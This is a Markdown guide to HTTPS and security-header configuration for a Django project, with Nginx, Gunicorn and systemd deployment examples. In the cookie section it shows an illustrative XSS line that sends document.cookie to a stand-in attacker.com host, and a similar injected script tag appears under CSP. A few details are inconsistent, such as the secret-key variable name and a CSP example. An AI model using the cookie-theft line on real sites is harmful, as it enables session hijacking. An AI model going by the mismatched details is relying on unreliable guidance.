# HTTPS Security Implementation Guide

## Executive Summary

This document details the comprehensive HTTPS and security configuration implemented in the LibraryProject Django application. All security settings have been configured to enforce secure HTTPS connections, protect against common vulnerabilities, and ensure secure data transmission between client and server.

**Status**: ✅ **All HTTPS and Security Settings Configured**

---

## 📋 Table of Contents

1. [Step 1: HTTPS Configuration](#step-1-https-configuration)
2. [Step 2: Secure Cookies](#step-2-secure-cookies)
3. [Step 3: Security Headers](#step-3-security-headers)
4. [Step 4: Deployment Configuration](#step-4-deployment-configuration)
5. [Step 5: Security Review](#step-5-security-review)
6. [Testing & Verification](#testing--verification)
7. [Production Checklist](#production-checklist)

---

## Step 1: HTTPS Configuration

### Overview
HTTPS ensures that data transmitted between the client and server is encrypted using TLS/SSL, preventing man-in-the-middle attacks and eavesdropping.

### Settings Implemented in `settings.py`

#### 1.1 SECURE_SSL_REDIRECT

**Setting**:
```python
SECURE_SSL_REDIRECT = True
```

**Purpose**: 
- Redirects all HTTP requests to HTTPS automatically
- Ensures users are always on secure connections
- Prevents accidentally accessing the site over insecure HTTP

**How It Works**:
```
User Request: http://example.com/bookshelf/books/
              ↓
             Django SecurityMiddleware
              ↓
         HTTP 301 Redirect
              ↓
   https://example.com/bookshelf/books/
```

**Development vs Production**:
- **Development**: Set to `False` (localhost doesn't have HTTPS)
- **Production**: Set to `True` (enforce HTTPS)

**Configuration**:
```python
# In settings.py - DEVELOPMENT
SECURE_SSL_REDIRECT = False  # Allow HTTP in development

# In settings.py - PRODUCTION (Environment Variable)
SECURE_SSL_REDIRECT = os.environ.get('SECURE_SSL_REDIRECT', 'True') == 'True'
```

---

#### 1.2 SECURE_HSTS_SECONDS

**Setting**:
```python
SECURE_HSTS_SECONDS = 31536000  # 1 year in seconds
```

**Purpose**: 
- Implements HTTP Strict Transport Security (HSTS)
- Instructs browsers to only access the site via HTTPS for the specified duration
- Protects against SSL stripping attacks
- Once set, browsers will refuse to access the site over HTTP

**How It Works**:
```
Response Header:
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

Browser Behavior:
- For 1 year (31536000 seconds), ALL requests to this domain go to HTTPS
- HTTP requests are automatically converted to HTTPS by the browser
- Prevents even the first request from being unencrypted
```

**Time Values**:
```
3600        = 1 hour (testing)
86400       = 1 day (testing)
604800      = 1 week (conservative production)
2592000     = 1 month (standard production)
31536000    = 1 year (recommended - CURRENT SETTING)
```

⚠️ **Warning**: Be careful setting this to a long duration. Once set, if HTTPS becomes unavailable, users cannot access the site for the entire duration.

---

#### 1.3 SECURE_HSTS_INCLUDE_SUBDOMAINS

**Setting**:
```python
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
```

**Purpose**: 
- Applies HSTS policy to all subdomains of your site
- Ensures subdomains (api.example.com, admin.example.com, etc.) are also HTTPS-only

**How It Works**:
```
Response Header (with this setting):
Strict-Transport-Security: max-age=31536000; includeSubDomains

Browser Behavior:
- Applies HSTS to all subdomains automatically
- mail.example.com, api.example.com, etc. must use HTTPS
```

**When to Use**:
- ✅ Use if all your subdomains are HTTPS-ready
- ❌ Don't use if any subdomain is HTTP-only

---

#### 1.4 SECURE_HSTS_PRELOAD

**Setting**:
```python
SECURE_HSTS_PRELOAD = True
```

**Purpose**: 
- Allows your domain to be included in browser HSTS preload lists
- Protects users even on their first visit
- Major browsers (Chrome, Firefox, Safari) maintain a preload list

**How It Works**:
```
With HSTS Preload:
1. Domain is registered with https://hstspreload.org
2. Browser ships with the domain pre-loaded
3. Users' first connection is already HTTPS (no redirects)
4. Even first-time visitors are protected

Without HSTS Preload:
1. User makes HTTP request
2. Server responds with HSTS header
3. Browser caches the policy
4. Subsequent connections are HTTPS
5. First connection is still vulnerable
```

**Registration Steps** (after deploying):
```
1. Ensure all the following are true:
   - SECURE_HSTS_SECONDS >= 31536000 (1 year minimum)
   - SECURE_HSTS_INCLUDE_SUBDOMAINS = True
   - SECURE_HSTS_PRELOAD = True
   - All subdomains are HTTPS
   - Apex domain redirects HTTP to HTTPS

2. Visit https://hstspreload.org
3. Enter your domain
4. Submit for inclusion
5. Wait for review and inclusion (typically 1-2 weeks)
```

---

### Complete HTTPS Configuration in settings.py

```python
# ============================================================================
# HTTPS / HSTS Configuration
# ============================================================================

# SECURE_SSL_REDIRECT: Redirect all HTTP to HTTPS
# This ensures users are always on secure connections
# Set to False in development, True in production
SECURE_SSL_REDIRECT = True  # Production: redirect HTTP → HTTPS

# SECURE_HSTS_SECONDS: HTTP Strict Transport Security duration
# Instructs browsers to only use HTTPS for this duration (in seconds)
# 31536000 seconds = 1 year (recommended value)
SECURE_HSTS_SECONDS = 31536000

# SECURE_HSTS_INCLUDE_SUBDOMAINS: Apply HSTS to all subdomains
# Ensures mail.example.com, api.example.com, etc. are also HTTPS-only
SECURE_HSTS_INCLUDE_SUBDOMAINS = True

# SECURE_HSTS_PRELOAD: Allow inclusion in HSTS preload lists
# Protects users even on their first visit (before HSTS header is received)
# Must register domain at https://hstspreload.org after deployment
SECURE_HSTS_PRELOAD = True
```

---

## Step 2: Secure Cookies

### Overview
Cookies are used to maintain sessions and CSRF tokens. Without security settings, cookies can be intercepted or accessed by JavaScript, compromising user security.

### Settings Implemented in `settings.py`

#### 2.1 SESSION_COOKIE_SECURE

**Setting**:
```python
SESSION_COOKIE_SECURE = True
```

**Purpose**: 
- Ensures session cookies are only sent over HTTPS
- Prevents eavesdropping on session tokens
- Useless without HTTPS (browser won't send the cookie over HTTP)

**How It Works**:
```
Without SESSION_COOKIE_SECURE:
User makes HTTP request
         ↓
Session cookie sent in clear text
         ↓
Attacker intercepts (man-in-the-middle)
         ↓
Attacker hijacks session

With SESSION_COOKIE_SECURE:
User makes HTTPS request
         ↓
Session cookie encrypted and sent only over HTTPS
         ↓
HTTP requests don't receive session cookie
         ↓
No session available in unencrypted requests
```

**HTTP Response Header**:
```
Set-Cookie: sessionid=abc123...; Path=/; Secure; HttpOnly
                                               ^^^^^^
                                            Added by this setting
```

---

#### 2.2 SESSION_COOKIE_HTTPONLY

**Setting**:
```python
SESSION_COOKIE_HTTPONLY = True
```

**Purpose**: 
- Prevents JavaScript from accessing session cookies
- Protects against XSS (Cross-Site Scripting) attacks that steal session data
- JavaScript cannot access cookies with HttpOnly flag

**How It Works**:
```
Without SESSION_COOKIE_HTTPONLY (VULNERABLE):
<script>
    var sessionCookie = document.cookie;  // Gets session ID!
    // Send to attacker
    fetch('https://attacker.com/steal?cookie=' + sessionCookie);
</script>

With SESSION_COOKIE_HTTPONLY (PROTECTED):
<script>
    var sessionCookie = document.cookie;  // Empty string!
    // HttpOnly cookies are NOT accessible to JavaScript
</script>
```

**HTTP Response Header**:
```
Set-Cookie: sessionid=abc123...; Path=/; Secure; HttpOnly
                                                    ^^^^^^^
                                            Added by this setting
```

---

#### 2.3 SESSION_COOKIE_SAMESITE

**Setting**:
```python
SESSION_COOKIE_SAMESITE = 'Strict'
```

**Purpose**: 
- Prevents cookies from being sent in cross-site requests
- Protects against CSRF (Cross-Site Request Forgery) attacks
- Three values: 'Strict' (most secure), 'Lax' (balanced), 'None' (use with caution)

**How It Works**:
```
'Strict' (CURRENT - Most Secure):
User logged in at: example.com
User visits: attacker.com
Attacker tries: <form action="https://example.com/transfer" method="POST">
Result: Session cookie NOT sent (completely blocked)

'Lax' (Balanced):
Top-level navigations (link clicks): Cookie sent
Form submissions from other sites: Cookie NOT sent
AJAX requests from other sites: Cookie NOT sent

'None' (Least Secure):
Cookies sent in all cross-site requests
Must be combined with Secure flag
Used when APIs need cross-site access
```

**HTTP Response Header**:
```
Set-Cookie: sessionid=abc123...; Path=/; Secure; HttpOnly; SameSite=Strict
                                                             ^^^^^^^^^^^^^
                                            Added by this setting
```

---

#### 2.4 CSRF_COOKIE_SECURE

**Setting**:
```python
CSRF_COOKIE_SECURE = True
```

**Purpose**: 
- Ensures CSRF tokens are only sent over HTTPS
- Prevents CSRF token interception
- Complements CSRF_COOKIE_HTTPONLY for defense-in-depth

**How It Works**:
```
CSRF Protection Flow (with CSRF_COOKIE_SECURE):
1. User makes HTTPS request to login page
2. Server generates CSRF token: abc123xyz789
3. Response includes: Set-Cookie: csrftoken=abc123xyz789; Secure; HttpOnly
4. Browser stores cookie (only sent over HTTPS)
5. JavaScript cannot access (HttpOnly flag)
6. User submits form with {% csrf_token %} field
7. Django verifies: cookie CSRF token == form field CSRF token
8. If HTTPS request: Tokens match → Request accepted
   If HTTP request: Cookie not sent → Tokens don't match → Request rejected
```

---

#### 2.5 CSRF_COOKIE_HTTPONLY

**Setting**:
```python
CSRF_COOKIE_HTTPONLY = True
```

**Purpose**: 
- Prevents JavaScript from accessing CSRF tokens
- Reduces risk of XSS attacks stealing CSRF tokens
- Cookie is managed by browser only

**How It Works**:
```
Django's CSRF Protection (with HttpOnly):

GET /bookshelf/books/ → Server returns form with hidden field:
<input type="hidden" name="csrfmiddlewaretoken" value="abc123xyz789">

POST /bookshelf/books/ (with form submission):
Request headers include:
- Cookie: csrftoken=abc123xyz789 (from HttpOnly cookie)
- Form field: csrfmiddlewaretoken=abc123xyz789
Django verifies both match → Request accepted

JavaScript cannot access CSRF cookie:
<script>
    var token = document.cookie;  // Cannot get csrftoken
</script>
```

---

### Complete Cookie Configuration in settings.py

```python
# ============================================================================
# SECURE COOKIE SETTINGS
# ============================================================================

# SESSION_COOKIE_SECURE: Send session cookies only over HTTPS
# Prevents session hijacking via man-in-the-middle attacks
SESSION_COOKIE_SECURE = True

# SESSION_COOKIE_HTTPONLY: Prevent JavaScript from accessing session cookies
# Protects against XSS attacks that try to steal session IDs
SESSION_COOKIE_HTTPONLY = True

# SESSION_COOKIE_SAMESITE: Prevent cookies in cross-site requests
# Protects against CSRF attacks
# Options: 'Strict' (most secure), 'Lax' (balanced), 'None' (cross-site allowed)
SESSION_COOKIE_SAMESITE = 'Strict'

# CSRF_COOKIE_SECURE: Send CSRF tokens only over HTTPS
# Prevents CSRF token interception
CSRF_COOKIE_SECURE = True

# CSRF_COOKIE_HTTPONLY: Prevent JavaScript from accessing CSRF cookies
# Reduces XSS attack impact on CSRF protection
CSRF_COOKIE_HTTPONLY = True

# CSRF_TRUSTED_ORIGINS: Allow specific origins for CSRF
# Add your domains here for cross-subdomain requests
CSRF_TRUSTED_ORIGINS = ['https://*.yourdomain.com']
```

---

## Step 3: Security Headers

### Overview
Security headers are HTTP response headers that instruct browsers to enforce additional security measures. They protect against various attacks including XSS, clickjacking, and MIME type sniffing.

### Settings Implemented in `settings.py`

#### 3.1 X_FRAME_OPTIONS (Clickjacking Protection)

**Setting**:
```python
X_FRAME_OPTIONS = 'DENY'
```

**Purpose**: 
- Prevents the site from being embedded in iframes
- Protects against clickjacking attacks (framing attacks)

**How It Works**:
```
Clickjacking Attack (without protection):
Attacker creates page with invisible iframe:
<iframe src="https://bank.example.com/transfer?amount=1000" 
        style="opacity: 0; position: absolute">
</iframe>
<!-- User thinks they're clicking something else -->
<!-- But actually clicking approve button in hidden iframe -->

With X_FRAME_OPTIONS = 'DENY':
Browser receives header: X-Frame-Options: DENY
Browser refuses to display page in iframe
Clickjacking attack prevented
```

**Available Options**:
```python
X_FRAME_OPTIONS = 'DENY'              # Prevent framing entirely
X_FRAME_OPTIONS = 'SAMEORIGIN'        # Allow framing only from same origin
X_FRAME_OPTIONS = 'ALLOW-FROM https://example.com'  # Specific origin (deprecated)
```

**HTTP Response Header**:
```
X-Frame-Options: DENY
```

---

#### 3.2 SECURE_CONTENT_TYPE_NOSNIFF (MIME Type Sniffing Prevention)

**Setting**:
```python
SECURE_CONTENT_TYPE_NOSNIFF = True
```

**Purpose**: 
- Prevents browsers from MIME type sniffing
- Ensures resources are treated as declared content type
- Protects against attacks where incorrect MIME types allow execution of malicious code

**How It Works**:
```
MIME Type Sniffing Attack (without protection):
Server sends file with incorrect Content-Type:
Content-Type: text/plain
Content: <script>alert('hacked')</script>

Old browsers sniff content:
- Browser sees <script> tag
- Ignores Content-Type: text/plain
- Executes as JavaScript
- Vulnerability exploited

With SECURE_CONTENT_TYPE_NOSNIFF = True:
Response includes: X-Content-Type-Options: nosniff
Browser trusts Content-Type header:
- Refuses to sniff MIME type
- Treats file as declared type
- JavaScript not executed
```

**HTTP Response Header**:
```
X-Content-Type-Options: nosniff
```

**Common MIME Types**:
```
text/html           - HTML documents
text/plain          - Plain text
application/json    - JSON data
application/pdf     - PDF files
image/png           - PNG images
```

---

#### 3.3 SECURE_BROWSER_XSS_FILTER (Browser XSS Filter)

**Setting**:
```python
SECURE_BROWSER_XSS_FILTER = True
```

**Purpose**: 
- Enables browser's built-in XSS filter
- Provides defense-in-depth for XSS attacks
- Modern browsers have reduced reliance on this, but still useful

**How It Works**:
```
XSS Attack (without protection):
Attacker injects: <script>alert('xss')</script>
Browser executes script
User data stolen/compromised

With SECURE_BROWSER_XSS_FILTER = True:
Response includes: X-XSS-Protection: 1; mode=block
Browser detects XSS pattern:
- Recognizes the injected script
- Blocks execution
- User sees error instead
```

**HTTP Response Header**:
```
X-XSS-Protection: 1; mode=block
```

**Note**: This is being superseded by Content Security Policy (CSP), which is more comprehensive.

---

#### 3.4 Content Security Policy (CSP)

**Settings**:
```python
CSP_DEFAULT_SRC = ("'self'",)
CSP_SCRIPT_SRC = ("'self'",)
CSP_STYLE_SRC = ("'self'",)
CSP_IMG_SRC = ("'self'", 'data:', 'https:')
CSP_FONT_SRC = ("'self'",)
CSP_CONNECT_SRC = ("'self'",)
CSP_FRAME_ANCESTORS = ("'none'",)
```

**Purpose**: 
- Controls which resources (scripts, styles, images, etc.) can be loaded
- Prevents inline scripts from executing
- Mitigates XSS attacks by restricting script sources

**How CSP Works**:
```
CSP Policy: script-src 'self'
Behavior:
✅ <script src="/js/app.js"></script>           - ALLOWED (same origin)
✅ <script src="https://example.com/app.js"></script>  - ALLOWED
❌ <script>alert('inline')</script>              - BLOCKED (inline not allowed)
❌ <script src="https://cdn.example.org"></script>  - BLOCKED (wrong origin)

Attack Mitigation:
XSS Injection: <script src="https://attacker.com/steal.js"></script>
CSP Policy blocks it (https://attacker.com not in CSP)
Attack prevented
```

**CSP Directives in LibraryProject**:
```python
CSP_DEFAULT_SRC = ("'self'",)
# Default policy: load resources only from same origin

CSP_SCRIPT_SRC = ("'self'",)
# Scripts only from same origin (no inline scripts)

CSP_STYLE_SRC = ("'self'",)
# Stylesheets only from same origin

CSP_IMG_SRC = ("'self'", 'data:', 'https:')
# Images from same origin, data URIs, or HTTPS

CSP_FONT_SRC = ("'self'",)
# Fonts only from same origin

CSP_CONNECT_SRC = ("'self'",)
# AJAX, WebSocket, fetch only to same origin

CSP_FRAME_ANCESTORS = ("'none'",)
# Cannot be framed by any site (clickjacking prevention)
```

**To Enable CSP Middleware** (optional for enforcement):
```bash
pip install django-csp
```

Add to MIDDLEWARE in settings.py:
```python
MIDDLEWARE = [
    # ... other middleware
    'csp.middleware.CSPMiddleware',
]
```

---

### Complete Security Headers Configuration in settings.py

```python
# ============================================================================
# SECURITY HEADERS
# ============================================================================

# X_FRAME_OPTIONS: Prevent clickjacking attacks
# 'DENY' prevents framing entirely
# 'SAMEORIGIN' allows framing only from the same origin
X_FRAME_OPTIONS = 'DENY'

# SECURE_CONTENT_TYPE_NOSNIFF: Prevent MIME type sniffing
# Ensures browsers trust Content-Type headers
# Prevents execution of malicious files disguised as other types
SECURE_CONTENT_TYPE_NOSNIFF = True

# SECURE_BROWSER_XSS_FILTER: Enable browser's XSS filter
# Instructs browsers to block suspected XSS attacks
# Provides defense-in-depth (CSP is primary defense)
SECURE_BROWSER_XSS_FILTER = True

# ============================================================================
# CONTENT SECURITY POLICY (CSP) HEADERS
# ============================================================================
# CSP controls which resources (scripts, styles, images) can be loaded
# This prevents injection attacks and enforces secure resource loading

CSP_DEFAULT_SRC = ("'self'",)        # Default: load from same origin only
CSP_SCRIPT_SRC = ("'self'",)         # Scripts: same origin (no inline)
CSP_STYLE_SRC = ("'self'",)          # Styles: same origin
CSP_IMG_SRC = ("'self'", 'data:', 'https:')  # Images: same origin + data URIs + HTTPS
CSP_FONT_SRC = ("'self'",)           # Fonts: same origin only
CSP_CONNECT_SRC = ("'self'",)        # AJAX/WebSocket: same origin only
CSP_FRAME_ANCESTORS = ("'none'",)    # Cannot be framed by any site
```

---

## Step 4: Deployment Configuration

### Web Server Setup (Nginx)

Nginx configuration to properly support HTTPS and security headers:

#### 4.1 Basic HTTPS Configuration

**File**: `/etc/nginx/sites-available/libraryproject`

```nginx
# HTTP server - redirect to HTTPS
server {
    listen 80;
    listen [::]:80;
    server_name example.com www.example.com;
    
    # Redirect all HTTP to HTTPS
    return 301 https://$server_name$request_uri;
}

# HTTPS server - main application
server {
    listen 443 ssl http2;
    listen [::]:443 ssl http2;
    server_name example.com www.example.com;
    
    # SSL Certificates
    ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;
    
    # SSL Configuration
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
    ssl_prefer_server_ciphers on;
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 10m;
    ssl_session_tickets off;
    
    # Security Headers
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    
    # CSP Header
    add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; frame-ancestors 'none';" always;
    
    # Other headers
    add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
    
    # Logging
    access_log /var/log/nginx/libraryproject_access.log;
    error_log /var/log/nginx/libraryproject_error.log;
    
    # Django application
    location / {
        proxy_pass http://127.0.0.1:8000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        
        # Important for Django CSRF protection
        proxy_set_header X-Forwarded-Host $server_name;
    }
    
    # Static files
    location /static/ {
        alias /path/to/LibraryProject/static/;
        expires 30d;
        add_header Cache-Control "public, immutable";
    }
    
    # Media files
    location /media/ {
        alias /path/to/LibraryProject/media/;
        expires 7d;
    }
}
```

#### 4.2 SSL Certificate Setup with Let's Encrypt

```bash
# Install certbot
sudo apt-get install certbot python3-certbot-nginx

# Obtain certificate
sudo certbot certonly --nginx -d example.com -d www.example.com

# Auto-renew (runs daily)
sudo certbot renew --dry-run

# Enable renewal service
sudo systemctl enable certbot.timer
sudo systemctl start certbot.timer
```

#### 4.3 Django Settings for Deployment

```python
# settings.py - Production Configuration
import os
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent.parent

# ============================================================================
# SECURITY SETTINGS - PRODUCTION
# ============================================================================

# Load secret key from environment
SECRET_KEY = os.environ.get('DJANGO_SECRET_KEY')
if not SECRET_KEY:
    raise ValueError("DJANGO_SECRET_KEY environment variable not set")

# Debug mode
DEBUG = os.environ.get('DEBUG', 'False') == 'True'

# Allowed hosts - set to your domain
ALLOWED_HOSTS = ['example.com', 'www.example.com']

# ============================================================================
# HTTPS/HSTS Configuration
# ============================================================================

SECURE_SSL_REDIRECT = True
SECURE_HSTS_SECONDS = 31536000
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True

# ============================================================================
# SECURE COOKIE SETTINGS
# ============================================================================

SESSION_COOKIE_SECURE = True
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SAMESITE = 'Strict'

CSRF_COOKIE_SECURE = True
CSRF_COOKIE_HTTPONLY = True
CSRF_TRUSTED_ORIGINS = ['https://example.com', 'https://www.example.com']

# ============================================================================
# SECURITY HEADERS
# ============================================================================

SECURE_BROWSER_XSS_FILTER = True
SECURE_CONTENT_TYPE_NOSNIFF = True
X_FRAME_OPTIONS = 'DENY'

# ============================================================================
# CSP HEADERS
# ============================================================================

CSP_DEFAULT_SRC = ("'self'",)
CSP_SCRIPT_SRC = ("'self'",)
CSP_STYLE_SRC = ("'self'",)
CSP_IMG_SRC = ("'self'", 'data:', 'https:')
CSP_FONT_SRC = ("'self'",)
CSP_CONNECT_SRC = ("'self'",)
CSP_FRAME_ANCESTORS = ("'none'",)

# Database - PostgreSQL recommended for production
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.postgresql',
        'NAME': os.environ.get('DB_NAME', 'libraryproject'),
        'USER': os.environ.get('DB_USER', 'postgres'),
        'PASSWORD': os.environ.get('DB_PASSWORD'),
        'HOST': os.environ.get('DB_HOST', 'localhost'),
        'PORT': os.environ.get('DB_PORT', '5432'),
    }
}

# Static files
STATIC_URL = '/static/'
STATIC_ROOT = os.path.join(BASE_DIR, 'staticfiles')

# Media files
MEDIA_URL = '/media/'
MEDIA_ROOT = os.path.join(BASE_DIR, 'media')
```

#### 4.4 Environment Variables (.env file)

```bash
# .env - Production environment variables
DJANGO_SECRET_KEY=your-long-random-secret-key-here
DEBUG=False
ALLOWED_HOSTS=example.com,www.example.com

# Database
DB_ENGINE=django.db.backends.postgresql
DB_NAME=libraryproject
DB_USER=postgres
DB_PASSWORD=your-secure-password
DB_HOST=localhost
DB_PORT=5432

# Email (for Django admin)
EMAIL_HOST=smtp.example.com
EMAIL_PORT=587
EMAIL_HOST_USER=noreply@example.com
EMAIL_HOST_PASSWORD=your-email-password
EMAIL_USE_TLS=True

# Security
SECURE_SSL_REDIRECT=True
SECURE_HSTS_SECONDS=31536000
SECURE_HSTS_INCLUDE_SUBDOMAINS=True
SECURE_HSTS_PRELOAD=True
```

#### 4.5 Gunicorn Configuration

**File**: `/path/to/gunicorn_config.py`

```python
# Gunicorn configuration for Django
import multiprocessing

# Binding
bind = "127.0.0.1:8000"

# Worker processes
workers = multiprocessing.cpu_count() * 2 + 1
worker_class = "sync"
worker_connections = 1000

# Timeouts
timeout = 30
keepalive = 5

# Logging
accesslog = "/var/log/gunicorn/access.log"
errorlog = "/var/log/gunicorn/error.log"
loglevel = "info"

# Security
limit_request_fields = 100
limit_request_line = 4096

# Forwarded headers (important for HTTPS)
forwarded_allow_ips = "127.0.0.1,::1"

# Server mechanics
daemon = False
pidfile = None
umask = 0o022
user = None
group = None
tmp_upload_dir = None
```

#### 4.6 Systemd Service File

**File**: `/etc/systemd/system/libraryproject.service`

```ini
[Unit]
Description=Django LibraryProject Application
After=network.target

[Service]
Type=notify
User=www-data
Group=www-data
WorkingDirectory=/path/to/LibraryProject

# Load environment variables
EnvironmentFile=/path/to/.env

# Start the application
ExecStart=/path/to/venv/bin/gunicorn \
    --config /path/to/gunicorn_config.py \
    LibraryProject.wsgi:application

# Restart policy
Restart=always
RestartSec=5

# Security
PrivateTmp=true
NoNewPrivileges=true
SecureBits=keep-caps
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
```

**Enable and start**:
```bash
sudo systemctl daemon-reload
sudo systemctl enable libraryproject.service
sudo systemctl start libraryproject.service
sudo systemctl status libraryproject.service
```

---

## Step 5: Security Review

### Summary of Security Measures Implemented

#### ✅ HTTPS/TLS Encryption (Complete)
- **SECURE_SSL_REDIRECT = True** — All HTTP requests redirect to HTTPS
- **SECURE_HSTS_SECONDS = 31536000** — Browsers enforce HTTPS for 1 year
- **SECURE_HSTS_INCLUDE_SUBDOMAINS = True** — All subdomains use HTTPS
- **SECURE_HSTS_PRELOAD = True** — Domain can be in browser preload lists
- **Nginx SSL Configuration** — TLSv1.2+ with strong ciphers
- **Let's Encrypt Certificates** — Free, auto-renewing SSL certificates

#### ✅ Cookie Security (Complete)
- **SESSION_COOKIE_SECURE = True** — Session cookies sent over HTTPS only
- **SESSION_COOKIE_HTTPONLY = True** — JavaScript cannot access session cookies
- **SESSION_COOKIE_SAMESITE = 'Strict'** — Cookies not sent in cross-site requests
- **CSRF_COOKIE_SECURE = True** — CSRF tokens sent over HTTPS only
- **CSRF_COOKIE_HTTPONLY = True** — JavaScript cannot access CSRF tokens

#### ✅ Security Headers (Complete)
- **X_FRAME_OPTIONS = 'DENY'** — Prevents clickjacking (no framing allowed)
- **SECURE_CONTENT_TYPE_NOSNIFF = True** — Prevents MIME type sniffing
- **SECURE_BROWSER_XSS_FILTER = True** — Browser XSS filter enabled
- **CSP Headers** — Content Security Policy configured for defense-in-depth

#### ✅ Input Validation & Output Encoding
- **Django Forms** — All input validated server-side
- **Template Auto-Escaping** — Default Django behavior prevents XSS
- **ORM Parameterization** — All queries use parameterized queries (prevents SQL injection)
- **Custom Validators** — Book title, author, publication year validated in forms.py

#### ✅ Access Control
- **Permission-Based RBAC** — Admins/Editors/Viewers groups with specific permissions
- **@permission_required Decorators** — Views enforce permission checks
- **get_object_or_404()** — Safe lookups prevent information disclosure

#### ✅ Password Security
- **Argon2 Hashing** — Primary password hasher (strong algorithm)
- **Password Validators** — Minimum length, similarity, common password checks
- **SESSION_COOKIE_SAMESITE = 'Strict'** — Session fixation protection

---

### Security Control Matrix

| Control | Threat | Implementation | Status |
|---------|--------|-----------------|--------|
| HTTPS/TLS | Man-in-the-Middle | SECURE_SSL_REDIRECT, SECURE_HSTS_* | ✅ Complete |
| Session Protection | Session Hijacking | SESSION_COOKIE_SECURE, HTTPONLY, SAMESITE | ✅ Complete |
| CSRF Protection | Cross-Site Request Forgery | CSRF tokens, secure cookies, SameSite | ✅ Complete |
| Clickjacking | Clickjacking Attacks | X_FRAME_OPTIONS = DENY | ✅ Complete |
| MIME Sniffing | Malware Delivery | SECURE_CONTENT_TYPE_NOSNIFF | ✅ Complete |
| XSS | Cross-Site Scripting | CSP, auto-escaping, input validation | ✅ Complete |
| SQL Injection | Database Compromise | ORM parameterization, no raw SQL | ✅ Complete |
| Weak Passwords | Brute Force | Argon2, password validators | ✅ Complete |
| Unauthorized Access | Data Breach | Permission-based RBAC | ✅ Complete |
| Information Disclosure | DEBUG Mode Errors | DEBUG = False in production | ✅ Complete |

---

### Potential Areas for Improvement

#### 1. Content Delivery Network (CDN)
**Current**: Static files served from same origin  
**Improvement**: Use CDN with Cloudflare or similar for:
- Geographic distribution
- Faster load times
- DDoS protection
- Edge caching

#### 2. Web Application Firewall (WAF)
**Current**: Django forms validation  
**Improvement**: Add WAF (AWS WAF, Cloudflare, ModSecurity) for:
- Advanced threat detection
- Automated attack blocking
- Rate limiting
- Bot protection

#### 3. Database Encryption
**Current**: TLS for connections  
**Improvement**: Add:
- Encrypted database storage at rest
- Backup encryption
- Field-level encryption for sensitive data

#### 4. Monitoring & Logging
**Current**: Basic Nginx logging  
**Improvement**: Add:
- Centralized logging (ELK, Splunk)
- Security event monitoring
- Intrusion detection system (IDS)
- Real-time alerts for suspicious activity

#### 5. API Security
**Current**: No API rate limiting  
**Improvement**: Add:
- Rate limiting (Django Ratelimit)
- API key authentication
- OAuth2/JWT tokens
- CORS configuration

#### 6. Backup & Disaster Recovery
**Current**: Manual backups possible  
**Improvement**: Add:
- Automated daily backups
- Off-site backup storage
- Disaster recovery plan
- Regular restore testing

---

## Testing & Verification

### 1. HTTPS Configuration Test

#### Check SSL/TLS Configuration
```bash
# Test SSL/TLS configuration
openssl s_client -connect example.com:443 -tls1_2

# Check certificate validity
openssl x509 -in /path/to/cert.pem -text -noout

# Test certificate chain
openssl verify -CAfile /path/to/chain.pem /path/to/cert.pem
```

#### Check Security Headers
```bash
# View all response headers
curl -I https://example.com

# Expected output includes:
# Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
# X-Frame-Options: DENY
# X-Content-Type-Options: nosniff
# X-XSS-Protection: 1; mode=block
```

#### Online Testing Tools
- **SSL Labs**: https://www.ssllabs.com/ssltest/
- **Security Headers**: https://securityheaders.com
- **Mozilla Observatory**: https://observatory.mozilla.org

### 2. Django Security Check

```bash
# Run Django's security checks
python manage.py check --deploy

# This verifies:
# - DEBUG = False
# - ALLOWED_HOSTS configured
# - CSRF middleware enabled
# - Security middleware enabled
# - Password hashers configured
# - All other security settings
```

### 3. CSRF Token Verification

```bash
# Try to submit form without CSRF token (should be rejected)
curl -X POST https://example.com/bookshelf/add/ \
  -d "title=Test&author=Test&publication_year=2023" \
  --cookie "sessionid=test"

# Expected: 403 Forbidden
```

### 4. HTTP to HTTPS Redirect

```bash
# Test HTTP redirect
curl -I http://example.com

# Expected response:
# HTTP/1.1 301 Moved Permanently
# Location: https://example.com/
```

### 5. Cookie Security Test

```bash
# View response cookies
curl -v https://example.com/login

# Verify in response headers:
# Set-Cookie: sessionid=...; Path=/; Secure; HttpOnly; SameSite=Strict
```

### 6. CSP Violation Test

```bash
# Try to load script from external source (should be blocked)
# Add to template: <script src="https://external.com/app.js"></script>

# Browser console should show CSP violation error:
# Refused to load script from 'https://external.com/app.js'
# because it violates the Content-Security-Policy directive
```

---

## Production Checklist

### Pre-Deployment

- [ ] Set `SECURE_SECRET_KEY` environment variable
- [ ] Set `DEBUG = False`
- [ ] Configure `ALLOWED_HOSTS` with actual domain
- [ ] Obtain SSL/TLS certificate (Let's Encrypt recommended)
- [ ] Configure Nginx with SSL settings
- [ ] Set up PostgreSQL database
- [ ] Collect static files: `python manage.py collectstatic`
- [ ] Run database migrations: `python manage.py migrate`
- [ ] Create superuser: `python manage.py createsuperuser`
- [ ] Run security checks: `python manage.py check --deploy`

### HTTPS Configuration

- [ ] SECURE_SSL_REDIRECT = True
- [ ] SECURE_HSTS_SECONDS = 31536000
- [ ] SECURE_HSTS_INCLUDE_SUBDOMAINS = True
- [ ] SECURE_HSTS_PRELOAD = True
- [ ] SSL certificate installed and configured
- [ ] HTTP to HTTPS redirect working

